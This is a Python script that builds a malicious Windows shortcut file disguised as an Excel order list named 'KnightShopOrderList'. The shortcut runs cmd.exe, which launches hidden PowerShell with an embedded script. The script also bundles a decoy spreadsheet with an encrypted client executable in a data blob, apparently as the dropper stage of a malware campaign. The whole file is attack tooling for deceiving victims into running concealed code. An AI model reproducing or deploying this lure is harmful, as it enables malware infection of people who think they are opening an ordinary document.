# Generate a LNK file with a PowerShell script embedded in it.
import os
import win32com.client
from typing import List, Dict

def compress_powershell_script(script_content: str) -> str:
    """
    Compress the PowerShell script content in a single line
    while still maintaining its original functionality. 
    """
    lines = script_content.splitlines()

    # Remove lines starting with `#` and strip extra whitespace
    code_lines = [line.strip() for line in lines if not line.strip().startswith("#")]
    code_lines = list(filter(None, code_lines))

    # Combine lines intelligently
    # If a line already ends with ';', do not add another
    oneliner = []
    for line in code_lines:
        if line.endswith(";"):
            oneliner.append(line)
        else:
            oneliner.append(line + ";")

    # Join all parts into a single line, ensuring proper spacing
    return " ".join(oneliner)

def create_dummy_data_file(data_paths: List[str], output_path: str) -> Dict[str, int]:
    """
    Create the dummy data file that stores arbitrary data in the specified paths.
    Concatenates the contents of the files listed in data_paths and writes to output_path.
    Returns a list of offsets in bytes for each file in the output file.
    """
    offsets = {}
    current_offset = 0
    
    with open(output_path, "wb") as f:
        for data_path in data_paths:
            with open(data_path, "rb") as data_file:
                print(f"Writing {data_path} to {output_path} at offset {current_offset}")
                offsets[data_path] = current_offset
                data = data_file.read()
                f.write(data)
                current_offset += len(data)
    
    return offsets

def generate_lnk_file(output_path: str, injected_ps1_path: str) -> None:
    """
    Generate a LNK file with a PowerShell script embedded in it using the win32com package.
    """
    try:
        # Read the PowerShell script content
        with open(injected_ps1_path, "r") as ps1_file:
            script_content = ps1_file.read()
        
        # Optionally compress or encode the script if needed
        compressed_script = compress_powershell_script(script_content)  # Implement this function
        
        # Set target, arguments, and other properties
        target = r"C:\Windows\System32\cmd.exe"  # Target executable
        arguments = f"/c powershell.exe -nop -w hidden -c \"{compressed_script}\""
        icon_path = r"C:\Windows\System32\cliconfig.exe"  # Optional icon
        description = "Excel sheet to shop order list"
        
        # Create the shortcut
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(output_path)
        shortcut.TargetPath = target
        shortcut.Arguments = arguments
        shortcut.WorkingDirectory = os.path.dirname(target)
        shortcut.IconLocation = icon_path
        shortcut.Description = description
        shortcut.save()

        print(f"Generated LNK file at: {output_path}")
    except Exception as e:
        print(f"Error generating LNK file: {e}")

if __name__ == "__main__":
    data_paths = ["../asset/KnightShopOrderList.xlsx",      # Benign Excel file
                  "../../client/dist/client_encrypted.exe"  # Encrypted client executable
                  ]
    output_path = "dummy_data.bin"
    offsets = create_dummy_data_file(data_paths, output_path)

    injected_ps1_path = "lnkScript.ps1"
    lnk_output_path = "KnightShopOrderList.lnk"
    generate_lnk_file(lnk_output_path, injected_ps1_path)